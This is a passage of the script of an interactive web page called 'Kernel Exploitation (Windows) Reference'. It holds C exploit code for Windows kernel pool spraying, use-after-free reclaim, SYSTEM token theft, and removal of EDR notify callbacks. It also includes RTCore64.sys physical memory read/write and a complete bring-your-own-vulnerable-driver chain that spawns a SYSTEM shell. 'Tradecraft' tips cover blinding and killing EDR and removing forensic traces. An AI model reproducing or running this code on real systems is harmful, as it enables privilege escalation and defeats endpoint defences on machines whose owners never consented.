{t:"Walk ActiveProcessLinks to find EPROCESS",l:"c",c:"// Walk EPROCESS linked list in kernel\n// Requires: arbitrary kernel read primitive\n\ntypedef struct _LIST_ENTRY {\n    struct _LIST_ENTRY *Flink;\n    struct _LIST_ENTRY *Blink;\n} LIST_ENTRY;\n\n// Offsets (Win10 21H2 x64 - VERIFY WITH SYMBOLS)\n#define EPROCESS_LINKS_OFFSET    0x2E8\n#define EPROCESS_PID_OFFSET      0x2E0\n#define EPROCESS_TOKEN_OFFSET    0x360\n#define EPROCESS_NAME_OFFSET     0x3E8\n\nUINT64 FindEPROCESS(UINT64 startProcess, DWORD targetPid) {\n    UINT64 current = startProcess;\n    do {\n        DWORD pid = KernelRead32(\n            current + EPROCESS_PID_OFFSET);\n        if (pid == targetPid)\n            return current;\n        UINT64 next = KernelRead64(\n            current + EPROCESS_LINKS_OFFSET);\n        current = next - EPROCESS_LINKS_OFFSET;\n    } while (current != startProcess);\n    return 0;\n}\n\n// Usage:\n// UINT64 system = FindEPROCESS(initial, 4);\n// UINT64 mine = FindEPROCESS(initial, GetCurrentProcessId());\n// UINT64 sysToken = KernelRead64(system + EPROCESS_TOKEN_OFFSET);\n// KernelWrite64(mine + EPROCESS_TOKEN_OFFSET, sysToken);"},
{t:"Resolve kernel base via NtQuerySystemInformation",l:"c",c:"// Info leak: get ntoskrnl.exe base address\n// Works from medium integrity (pre-Win10 RS3)\n// Post-RS3: requires admin or specific info class\n\ntypedef struct _RTL_PROCESS_MODULE_INFORMATION {\n    HANDLE Section;\n    PVOID MappedBase;\n    PVOID ImageBase;  // kernel module base\n    ULONG ImageSize;\n    ULONG Flags;\n    USHORT LoadOrderIndex;\n    USHORT InitOrderIndex;\n    USHORT LoadCount;\n    USHORT OffsetToFileName;\n    UCHAR FullPathName[256];\n} RTL_PROCESS_MODULE_INFORMATION;\n\nUINT64 GetKernelBase(void) {\n    DWORD needed = 0;\n    NtQuerySystemInformation(\n        SystemModuleInformation, NULL, 0, &needed);\n    PVOID buf = malloc(needed);\n    NtQuerySystemInformation(\n        SystemModuleInformation, buf, needed, &needed);\n    // First module is ntoskrnl.exe\n    RTL_PROCESS_MODULE_INFORMATION* mod =\n        (RTL_PROCESS_MODULE_INFORMATION*)\n        ((PBYTE)buf + sizeof(ULONG));\n    UINT64 base = (UINT64)mod->ImageBase;\n    free(buf);\n    return base; // e.g., 0xfffff80012345000\n}"}
];
C.drv=[
{t:"IOCTL fuzzing template",l:"c",c:"// Basic IOCTL fuzzer for driver attack surface mapping\n\n#define DEVICE_NAME \"\\\\\\\\.\\\\VulnDevice\"\n\nvoid FuzzIOCTLs(void) {\n    HANDLE hDev = CreateFileA(DEVICE_NAME,\n        GENERIC_READ | GENERIC_WRITE,\n        0, NULL, OPEN_EXISTING, 0, NULL);\n    if (hDev == INVALID_HANDLE_VALUE) {\n        printf(\"Cannot open device\\n\");\n        return;\n    }\n\n    BYTE inBuf[4096] = {0};\n    BYTE outBuf[4096] = {0};\n    DWORD returned;\n\n    // CTL_CODE: DeviceType(16) | Access(2) | Function(12) | Method(2)\n    // Iterate common device types and function codes\n    for (DWORD devType = 0x8000; devType < 0x8010; devType++) {\n        for (DWORD func = 0; func < 0x1000; func++) {\n            for (DWORD method = 0; method < 4; method++) {\n                DWORD ioctl = (devType << 16) |\n                    (FILE_ANY_ACCESS << 14) |\n                    (func << 2) | method;\n                BOOL ok = DeviceIoControl(hDev, ioctl,\n                    inBuf, sizeof(inBuf),\n                    outBuf, sizeof(outBuf),\n                    &returned, NULL);\n                if (ok || GetLastError() != ERROR_INVALID_FUNCTION) {\n                    printf(\"VALID IOCTL: 0x%08X (ret=%d)\\n\",\n                        ioctl, ok);\n                }\n            }\n        }\n    }\n    CloseHandle(hDev);\n}"}
];
C.pol=[
{t:"Pool spray with named pipe objects",l:"c",c:"// Pool spray: fill NonPagedPool with identically-sized objects\n// Named pipe attributes are kernel-allocated, controllable size\n\n#define SPRAY_COUNT 10000\n#define HOLE_INTERVAL 16\nHANDLE pipes[SPRAY_COUNT];\n\nvoid SprayPool(SIZE_T targetSize) {\n    // Phase 1: Fill pool with spray objects\n    for (int i = 0; i < SPRAY_COUNT; i++) {\n        char name[64];\n        sprintf(name, \"\\\\\\\\.\\\\pipe\\\\spray_%d\", i);\n        pipes[i] = CreateNamedPipeA(name,\n            PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE,\n            1, targetSize, targetSize, 0, NULL);\n    }\n\n    // Phase 2: Create holes at regular intervals\n    for (int i = 0; i < SPRAY_COUNT; i += HOLE_INTERVAL) {\n        CloseHandle(pipes[i]);\n        pipes[i] = NULL;\n    }\n\n    // Phase 3: Trigger vulnerable allocation\n    // The allocation will fill one of our holes\n    // Adjacent objects are our spray objects\n    TriggerVulnerableAlloc(targetSize);\n\n    // Phase 4: Overflow into adjacent pipe object\n    // Corrupts pipe metadata or adjacent pool header\n}"},
{t:"Use-After-Free reclaim with IoCompletionPort",l:"c",c:"// UAF: reclaim freed slot with IoCompletionPort\n// IoCompletionPort allocations have controllable size\n\nvoid ExploitUAF(SIZE_T objectSize) {\n    // Step 1: Trigger the free (bug-specific)\n    TriggerFree();\n    // Dangling pointer exists to freed memory\n\n    // Step 2: Spray to reclaim the freed slot\n    HANDLE ports[1000];\n    for (int i = 0; i < 1000; i++) {\n        ports[i] = CreateIoCompletionPort(\n            INVALID_HANDLE_VALUE, NULL, 0, 0);\n        // NtSetIoCompletion to allocate controlled data\n        // in the freed slot's pool chunk\n    }\n\n    // Step 3: Trigger use of dangling pointer\n    // Kernel reads our controlled data as original object\n    TriggerUse();\n    // If object had vtable: we control function pointers\n    // If object had data: we control kernel reads\n}"}
];
C.tkn=[
{t:"Full token overwrite via arbitrary R/W",l:"c",c:"void TokenOverwrite(\n    UINT64 (*KRead64)(UINT64),\n    void (*KWrite64)(UINT64, UINT64))\n{\n    // Step 1: Find System EPROCESS (PID 4)\n    // Start from PsInitialSystemProcess or current process\n    UINT64 current = GetCurrentEPROCESS();\n    UINT64 system = 0;\n\n    UINT64 walk = current;\n    do {\n        DWORD pid = (DWORD)KRead64(\n            walk + EPROCESS_PID_OFFSET);\n        if (pid == 4) {\n            system = walk;\n            break;\n        }\n        UINT64 flink = KRead64(\n            walk + EPROCESS_LINKS_OFFSET);\n        walk = flink - EPROCESS_LINKS_OFFSET;\n    } while (walk != current);\n\n    if (!system) return; // Failed\n\n    // Step 2: Read SYSTEM token\n    UINT64 sysToken = KRead64(\n        system + EPROCESS_TOKEN_OFFSET);\n    sysToken &= ~0xFULL; // Clear EX_FAST_REF bits\n\n    // Step 3: Overwrite current process token\n    UINT64 myToken = KRead64(\n        current + EPROCESS_TOKEN_OFFSET);\n    KWrite64(current + EPROCESS_TOKEN_OFFSET,\n        sysToken | (myToken & 0xF));\n\n    // Step 4: Verify - spawn cmd\n    system(\"cmd.exe\");\n    // Should show: nt authority\\system\n}"}
];
C.cbk=[
{t:"Remove EDR process notify callbacks",l:"c",c:"void RemoveProcessCallbacks(\n    UINT64 (*KRead64)(UINT64),\n    void (*KWrite64)(UINT64, UINT64),\n    UINT64 ntosBase)\n{\n    // Resolve PspCreateProcessNotifyRoutine\n    // Offset from ntoskrnl base (build-specific)\n    // Find via: pattern scan or symbol resolution\n    UINT64 pArray = ntosBase + NOTIFY_ARRAY_OFFSET;\n\n    for (int i = 0; i < 64; i++) {\n        UINT64 entry = KRead64(pArray + i * 8);\n        if (!entry) continue;\n\n        // Entry is EX_FAST_REF: mask low 4 bits\n        UINT64 block = entry & ~0xFULL;\n\n        // EX_CALLBACK_ROUTINE_BLOCK:\n        // +0x00: EX_RUNDOWN_REF\n        // +0x08: PEX_CALLBACK_FUNCTION (the callback)\n        UINT64 callback = KRead64(block + 0x08);\n\n        // Check if callback is in EDR module range\n        if (IsInEDRRange(callback)) {\n            printf(\"Removing EDR callback at index %d\\n\", i);\n            // Zero the entire entry\n            KWrite64(pArray + i * 8, 0);\n        }\n    }\n\n    // Repeat for:\n    // PspCreateThreadNotifyRoutine\n    // PspLoadImageNotifyRoutine\n    // ObTypeCallbacks (Process, Thread)\n}"}
];
C.byo=[
{t:"RTCore64.sys arbitrary R/W primitives",l:"c",c:"// RTCore64.sys: MSI Afterburner driver\n// Physical memory read/write via IOCTLs\n\n#define RTCORE_DEVICE \"\\\\\\\\.\\\\RTCore64\"\n#define IOCTL_READ  0x80002048\n#define IOCTL_WRITE 0x8000204C\n\ntypedef struct {\n    ULONG_PTR Unused1;\n    ULONG_PTR Address;   // physical address\n    ULONG_PTR Unused2;\n    ULONG Size;          // bytes to read/write\n    ULONG Value;         // value for write\n    ULONG Unused3;\n} RTCORE_REQUEST;\n\nUINT64 PhysRead64(HANDLE hDev, UINT64 physAddr) {\n    RTCORE_REQUEST req = {0};\n    req.Address = physAddr;\n    req.Size = 8;\n    DWORD ret;\n    DeviceIoControl(hDev, IOCTL_READ,\n        &req, sizeof(req), &req, sizeof(req), &ret, NULL);\n    return *(UINT64*)&req.Value;\n}\n\nvoid PhysWrite64(HANDLE hDev, UINT64 physAddr, UINT64 val) {\n    RTCORE_REQUEST req = {0};\n    req.Address = physAddr;\n    req.Size = 8;\n    *(UINT64*)&req.Value = val;\n    DWORD ret;\n    DeviceIoControl(hDev, IOCTL_WRITE,\n        &req, sizeof(req), &req, sizeof(req), &ret, NULL);\n}\n\n// Virtual-to-physical translation:\n// Walk PML4 -> PDPT -> PD -> PT manually\n// Or: use MmGetPhysicalAddress equivalent"}
];
C.mit=[
{t:"Check active kernel mitigations",l:"ps",c:"# Check VBS / HVCI / Credential Guard status\nGet-CimInstance -ClassName Win32_DeviceGuard \\\n    -Namespace root\\Microsoft\\Windows\\DeviceGuard |\n    Select VirtualizationBasedSecurityStatus,\n        CodeIntegrityPolicyEnforcementStatus,\n        UsermodeCodeIntegrityPolicyEnforcementStatus\n\n# VBS status:\n# 0 = Not configured, 1 = Enabled but not running, 2 = Running\n\n# Check Secure Boot\nConfirm-SecureBootUEFI\n\n# Check SMEP/SMAP (CPU features)\n# In WinDbg: !cpuinfo -> check CR4 flags\n# CR4.SMEP = bit 20, CR4.SMAP = bit 21\n\n# Check loaded drivers (potential BYOVD candidates)\ndriverquery /v | findstr /i \"vuln\\|rtcore\\|dbutil\\|capcom\"\n\n# Check driver block list\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config\" /v VulnerableDriverBlocklistEnable\n\n# Check PatchGuard / KPP\n# No direct query - it is always active on x64\n# Bypass detection: BSOD with CRITICAL_STRUCTURE_CORRUPTION"}
];
C.kit=[
{t:"WinDbg kernel debugging setup",l:"bash",c:"# Local kernel debugging (limited, no breakpoints)\nbcdedit /debug on\nbcdedit /dbgsettings local\n# Open WinDbg: File -> Kernel Debug -> Local\n\n# Remote kernel debugging (full access)\n# Target machine:\nbcdedit /debug on\nbcdedit /dbgsettings net hostip:DEBUGGER_IP port:50000\n# Outputs key: use on debugger side\n\n# Debugger machine:\n# WinDbg: File -> Kernel Debug -> Net\n# Enter port + key from target\n\n# Essential first commands:\n.reload /f              # force symbol reload\nlm                      # list loaded modules\n!process 0 0           # list all processes\ndt nt!_EPROCESS        # show structure layout\n\n# Find offsets for current build:\ndt nt!_EPROCESS UniqueProcessId\ndt nt!_EPROCESS ActiveProcessLinks\ndt nt!_EPROCESS Token\ndt nt!_EPROCESS ImageFileName\n\n# Pool analysis:\n!pool <addr>\n!pooltag\n!poolused 2\n\n# Callback enumeration:\n!callback"}
];
C.cha=[
{t:"Complete BYOVD token steal implementation",l:"c",c:"// Full chain: load driver -> defeat KASLR -> token overwrite\n\nint main() {\n    // Step 1: Load vulnerable driver\n    system(\"sc create RTCore type= kernel binPath= C:\\\\temp\\\\RTCore64.sys\");\n    system(\"sc start RTCore\");\n    HANDLE hDev = CreateFileA(\"\\\\\\\\.\\\\RTCore64\",\n        GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);\n\n    // Step 2: Get ntoskrnl base (KASLR defeat)\n    UINT64 ntosBase = GetKernelBase(); // NtQuerySystemInformation\n\n    // Step 3: Resolve PsInitialSystemProcess\n    // Load ntoskrnl.exe in usermode, get export RVA\n    HMODULE hNtos = LoadLibraryA(\"ntoskrnl.exe\");\n    UINT64 rva = (UINT64)GetProcAddress(hNtos,\n        \"PsInitialSystemProcess\") - (UINT64)hNtos;\n    UINT64 pSystemProcess = ntosBase + rva;\n    UINT64 systemEPROCESS = PhysRead64(hDev,\n        VirtToPhys(pSystemProcess));\n\n    // Step 4: Walk process list, find current\n    DWORD myPid = GetCurrentProcessId();\n    UINT64 myEPROCESS = FindEPROCESS(\n        systemEPROCESS, myPid);\n\n    // Step 5: Token overwrite\n    UINT64 sysToken = PhysRead64(hDev,\n        VirtToPhys(systemEPROCESS + 0x360));\n    sysToken &= ~0xFULL;\n    UINT64 myTokenRef = PhysRead64(hDev,\n        VirtToPhys(myEPROCESS + 0x360));\n    PhysWrite64(hDev,\n        VirtToPhys(myEPROCESS + 0x360),\n        sysToken | (myTokenRef & 0xF));\n\n    // Step 6: We are SYSTEM\n    system(\"cmd.exe\");\n\n    // Cleanup\n    system(\"sc stop RTCore\");\n    system(\"sc delete RTCore\");\n}"}
];
return C[s]||[];
}
var TR={
arc:[
{t:"EPROCESS offsets change EVERY build",d:"Never hardcode offsets. Use symbols (PDB) or dynamic resolution. The Token offset moved from 0x358 to 0x360 to 0x4B8 across different builds. Always verify with dt nt!_EPROCESS."},
{t:"EX_FAST_REF encodes reference count in low bits",d:"Token, Object pointers use EX_FAST_REF: pointer | ref_count. Mask low 4 bits (& ~0xF) to get real pointer. When writing, preserve original low bits."},
{t:"Segment Heap replaced the legacy pool allocator",d:"Win10 19H1+ uses Segment Heap in kernel. VS/LFH/Large buckets. Pool exploitation techniques from pre-19H1 don't directly apply. Spray strategies must account for segment heap behavior."},
{t:"PreviousMode is the kernel's trust boundary",d:"KTHREAD.PreviousMode: 1=UserMode, 0=KernelMode. Kernel checks this to decide whether to validate pointers. If you can set it to 0, all Nt* functions skip access checks."}
],
drv:[
{t:"METHOD_NEITHER is the most dangerous buffer method",d:"Driver receives raw user pointers. If the driver doesn't call ProbeForRead/ProbeForWrite, an attacker can pass kernel addresses. The driver reads/writes kernel memory thinking it's user memory."},
{t:"NULL DACL on device objects = everyone can access",d:"Many vulnerable drivers create device objects with NULL security descriptors. Any user process can open a handle and send IOCTLs. Check with WinObj or DeviceIoControl from low-priv."},
{t:"IOCTL codes encode the buffer method in low 2 bits",d:"CTL_CODE(DeviceType, Function, Method, Access). Method: 0=BUFFERED, 1=IN_DIRECT, 2=OUT_DIRECT, 3=NEITHER. Extract with: ioctl & 3. This tells you the attack surface per IOCTL."},
{t:"IDA Pro for IOCTL handler reverse engineering",d:"Find DriverEntry -> MajorFunction[IRP_MJ_DEVICE_CONTROL] -> switch(ioctl_code). Each case is an attack surface entry point. Trace input buffer handling for every case."}
],
pol:[
{t:"Pool spray reliability depends on heap state",d:"Segment Heap LFH has randomization. Spray thousands of objects to increase probability. More spray = more reliable. 10000+ objects is common for reliable exploitation."},
{t:"Same-size allocations land in the same pool bucket",d:"Pool allocators group allocations by size. To spray adjacent to a target, your spray objects must be the same size as the vulnerable allocation. Match sizes exactly."},
{t:"Named pipes and IoCompletionPorts are favorite spray objects",d:"Both allow kernel allocations of controllable size from usermode. Named pipe attributes and IoCompletion packets are the most common spray vehicles."},
{t:"Data-only corruption bypasses all code integrity mitigations",d:"If you corrupt a data structure (token, callback array) instead of hijacking code execution, SMEP/HVCI/kCFG don't apply. Modern exploitation favors data-only attacks."}
],
tkn:[
{t:"Token overwrite is the simplest kernel privilege escalation",d:"One kernel write to copy SYSTEM token to your process. No ROP chains, no shellcode, no code execution. Pure data manipulation. Works even with HVCI and kCFG enabled."},
{t:"Privilege bitmap modification is an alternative to token swap",d:"Instead of replacing the entire token, set TOKEN.Privileges.Present and .Enabled to all 1s. This grants every privilege without changing token identity. Subtler than full swap."},
{t:"PsInitialSystemProcess is your anchor point",d:"Exported by ntoskrnl.exe. Points to the System process EPROCESS. From here, walk ActiveProcessLinks to find any process. Load ntoskrnl in usermode to get the RVA."},
{t:"Always preserve EX_FAST_REF low bits when writing tokens",d:"Token field is EX_FAST_REF: pointer | ref_count. If you write the full 8 bytes including wrong low bits, reference counting breaks and you may BSOD. Mask correctly."}
],
cbk:[
{t:"Process notify removal blinds most EDR behavioral detection",d:"EDR process creation callbacks are the primary behavioral telemetry source. Removing just these entries prevents the EDR from seeing new process creation. Highest-impact single removal."},
{t:"Object callbacks block handle operations",d:"ObRegisterCallbacks pre-operation handlers can strip access rights from handles. EDR uses this to prevent OpenProcess with write access. Removing these unblocks injection techniques."},
{t:"Minifilter removal enables file drops to disk",d:"EDR minifilters scan every file write. Until you remove them, any payload dropped to disk gets scanned. Remove minifilters if you need disk-based payloads."},
{t:"Callback arrays have a maximum of 64 entries",d:"PspCreateProcessNotifyRoutine has space for 64 callbacks. Walk all 64 slots, check each for non-null. The actual EDR callback is at EX_CALLBACK_ROUTINE_BLOCK + 0x08."}
],
byo:[
{t:"RTCore64.sys is the most commonly used BYOVD driver",d:"Physical memory R/W via simple IOCTLs. Widely documented. But: increasingly flagged by driver block lists. Have backup drivers ready."},
{t:"Physical-to-virtual translation is the hardest part",d:"Physical memory R/W drivers give you physical addresses. You need to walk page tables (PML4->PDPT->PD->PT) to translate virtual addresses. Build a PTE walker."},
{t:"ProcExp.sys is Microsoft-signed and often unblocked",d:"Sysinternals Process Explorer driver can kill protected processes. Microsoft-signed, so it passes most block lists. Useful for killing EDR processes directly."},
{t:"Always clean up: stop and delete the driver service",d:"Loaded vulnerable drivers are obvious forensic artifacts. After exploitation: sc stop + sc delete + delete .sys file. Time-window exposure matters."}
],
mit:[
{t:"SMEP makes ret2user impossible on modern systems",d:"CPU refuses to execute user-mode pages from ring 0. Classic shellcode-in-usermode exploit technique is dead on any system with SMEP (all modern x64 CPUs)."},
{t:"HVCI prevents all kernel code execution attacks",d:"Hypervisor enforces W^X in kernel. Cannot allocate RWX, cannot make data executable. Only data-only attacks work with HVCI. This is the future of kernel defense."},
{t:"VBS creates a security boundary the OS kernel cannot break",d:"Even if you fully compromise the NT kernel, VBS/VTL1 secrets (Credential Guard) are inaccessible. Hypervisor protects them. Only a hypervisor escape reaches VTL1."},
{t:"PatchGuard timing is randomized and unpredictable",d:"KPP checks run at random intervals (5-10 minutes). Modifying SSDT/IDT/etc and restoring before the next check is unreliable. Data-only attacks that don't modify monitored structures are preferred."}
],
kit:[
{t:"WinDbg kernel debugging requires a two-machine setup for full access",d:"Local kernel debugging is limited (no breakpoints, no stepping). For full kernel debugging, use network debugging between two VMs. One as target, one as debugger."},
{t:"HEVD is the best training ground for kernel exploitation",d:"HackSys Extreme Vulnerable Driver has: stack overflow, pool overflow, UAF, type confusion, integer overflow, arbitrary overwrite. Practice each exploit class safely."},
{t:"Symbol resolution is critical for kernel exploitation",d:"Every offset depends on the exact Windows build. Use Microsoft symbol servers (.sympath SRV*) to resolve structures dynamically. Never hardcode offsets for production exploits."},
{t:"EDRSandblast automates the entire BYOVD-to-blind pipeline",d:"Loads driver, resolves callback arrays, identifies EDR entries, removes them. Supports multiple vulnerable drivers. Good reference implementation even if using custom tooling."}
],
cha:[
{t:"Data-only attacks bypass SMEP + HVCI + kCFG simultaneously",d:"Token overwrite and callback removal only modify data structures. No code execution needed. This is why data-only exploitation is the modern standard for kernel attacks."},
{t:"Info leak is always the first step",d:"KASLR means you need the kernel base address before doing anything. NtQuerySystemInformation (admin required post-RS3) or driver-specific info leaks. No base = no exploitation."},
{t:"Virtual-to-physical translation is required for physical R/W drivers",d:"Most BYOVD drivers expose physical memory IOCTLs. But kernel structures are at virtual addresses. You must walk 4-level page tables to translate. This is non-trivial and build-specific."},
{t:"BSOD recovery: always test on exact target build first",d:"Kernel exploits are unforgiving. Wrong offset = BSOD. Wrong pool size = BSOD. Wrong reference count = delayed BSOD. Lab testing on the exact target OS build is mandatory."}
]
};
function render(){
var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
var codes=getCodes(S.s),tricks=TR[S.s]||[];
var flow='';
if(S.s==='arc')flow=fARC();else if(S.s==='drv')flow=fDRV();else if(S.s==='pol')flow=fPOL();
else if(S.s==='tkn')flow=fTKN();else if(S.s==='cbk')flow=fCBK();else if(S.s==='byo')flow=fBYO();
else if(S.s==='mit')flow=fMIT();else if(S.s==='kit')flow=fKIT();else if(S.s==='cha')flow=fCHA();
var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
var thtml=tricks.length===0?'':
'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">TRADECRAFT</div>'+
tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
$('#app').innerHTML=
'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Kernel Exploitation (Windows) Reference</h1><div class="sub">Architecture \u2022 Drivers \u2022 Pool \u2022 Tokens \u2022 Callbacks \u2022 BYOVD \u2022 Mitigations \u2022 Toolkit \u2022 Exploit Chains</div></div></div><div class="st">'+
SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Tradecraft'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
'<div class="ft">'+[{c:"#34d399",l:"Architecture"},{c:"#60a5fa",l:"Drivers"},{c:"#a78bfa",l:"Pool"},{c:"#f87171",l:"Tokens"},{c:"#fbbf24",l:"Callbacks"},{c:"#f59e0b",l:"BYOVD"},{c:"#e879f9",l:"Mitigations"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Chains"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
$$('.cp').forEach(function(p){
p.querySelector('.ct2').onclick=function(){
var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
if(ex){ex.remove();cv.classList.remove('op');return}
cv.classList.add('op');
var ci=parseInt(p.dataset.ci),c=codes[ci];
var pre=document.createElement('pre');pre.className='cb mono';
pre.innerHTML=c.c.split('\n').map(function(line){
var ci2=line.indexOf('//');if(ci2<0)ci2=line.indexOf('#');
if(ci2>=0)return esc(line.slice(0,ci2))+'<span class="cm">'+esc(line.slice(ci2))+'</span>';
return esc(line);
}).join('\n');
p.appendChild(pre);};
});
$$('.ti').forEach(function(p){
p.querySelector('.tt').onclick=function(){
var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
p.classList.add('op');cv.classList.add('op');
var ti=parseInt(p.dataset.ti);
var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
p.appendChild(div);};
});
}
render();
</script>
</body>
</html>
